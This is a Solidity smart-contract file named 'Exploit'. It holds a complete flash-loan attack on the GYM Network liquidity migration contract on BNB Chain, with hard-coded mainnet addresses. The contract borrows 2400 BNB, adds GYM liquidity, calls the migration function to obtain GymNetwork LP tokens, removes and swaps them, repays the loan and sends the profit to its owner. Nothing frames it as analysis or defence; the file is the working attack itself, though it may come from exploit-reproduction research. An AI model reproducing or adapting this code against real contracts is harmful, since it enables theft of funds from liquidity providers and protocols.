// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface IPancakeSwapRouter  {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
        
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ILiquidityMigrationV2 {
    function migrate(uint256 _lpTokens) external;
}

interface IERC20 {
    function balanceOf(address owner) external returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
}

interface IWBNB is IERC20{
    function withdraw(uint256 amount) external;
}

interface IPancakePair is IERC20{
    function swap(
        uint amount0Out, 
        uint amount1Out, 
        address to, 
        bytes calldata data
    ) external;
}

interface IPancakeCallee {
    function pancakeCall(
        address sender, 
        uint amount0, 
        uint amount1, 
        bytes calldata data
    ) external;
}



contract Exploit is IPancakeCallee {
    
    address private immutable _owner;
    
    IPancakeSwapRouter private immutable  _pancakeSwapRouter = IPancakeSwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    ILiquidityMigrationV2 private immutable  _liquidityMigration = ILiquidityMigrationV2(0x1BEfe6f3f0E8edd2D4D15Cae97BAEe01E51ea4A4);

    IERC20 private immutable _GYM = IERC20(0xE98D920370d87617eb11476B41BF4BE4C556F3f8);

    IERC20 private immutable _GYM_NETWORK = IERC20(0x3a0d9d7764FAE860A659eb96A500F1323b411e68);

    IWBNB private immutable _WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IPancakePair private immutable _BusdBnbPair = IPancakePair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);

    IPancakePair private immutable _WbnbGymPair = IPancakePair(0x8dC058bA568f7D992c60DE3427e7d6FC014491dB);

    IPancakePair private immutable _WbnbGymnetworkPair = IPancakePair(0x627F27705c8C283194ee9A85709f7BD9E38A1663);

    constructor() {
        _owner = msg.sender;
    }

    function pancakeCall(
        address, 
        uint amount0, 
        uint, 
        bytes calldata
    ) external override {
        require(msg.sender == address(_BusdBnbPair), "Not called by BNB_BUSD pair");

        //swap 600 BNB for GYM
        _WBNB.approve(address(_pancakeSwapRouter), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(_WBNB);
        path[1] = address(_GYM);
        _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            600e18,
            0,
            path,
            address(this),
            block.timestamp
        );

        //add Liquidity to BNB_GYM pair,
        _GYM.approve(address(_pancakeSwapRouter), type(uint).max);
        _pancakeSwapRouter.addLiquidity(
            address(_WBNB),
            address(_GYM),
            _WBNB.balanceOf(address(this)),
            _GYM.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );

        //migrate the liqudity from WBNB_GYM to WBNB_GymNetwork
        _WbnbGymPair.approve(address(_liquidityMigration), type(uint).max);
        _liquidityMigration.migrate(_WbnbGymPair.balanceOf(address(this)));

        //remove WBNB_GymNetwork liquditiy
        _WbnbGymnetworkPair.approve(address(_pancakeSwapRouter), type(uint).max);
        _pancakeSwapRouter.removeLiquidity(
            address(_GYM_NETWORK),
            address(_WBNB),
            _WbnbGymnetworkPair.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );

        //swap remaining full balance of Gym to WBNB
        path[0] = address(_GYM);
        path[1] = address(_WBNB);
        _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _GYM.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        //swap full balance of GymNetwork to WBNB
        _GYM_NETWORK.approve(address(_pancakeSwapRouter), type(uint).max);
        path[0] = address(_GYM_NETWORK);
        path[1] = address(_WBNB);
        _pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            _GYM_NETWORK.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        _WBNB.transfer(address(_BusdBnbPair), amount0 + amount0 * 3 / 997 + 1);

    }

    function execute() external {
        require(msg.sender == _owner, "Oops!");
        //flash loan 2400 BNB
        _BusdBnbPair.swap(
            2400e18, 
            0, 
            address(this), 
            new bytes(1)
        );
        _WBNB.withdraw(_WBNB.balanceOf(address(this)));
        payable(_owner).transfer(address(this).balance);
    }
    
    receive() payable external {}
}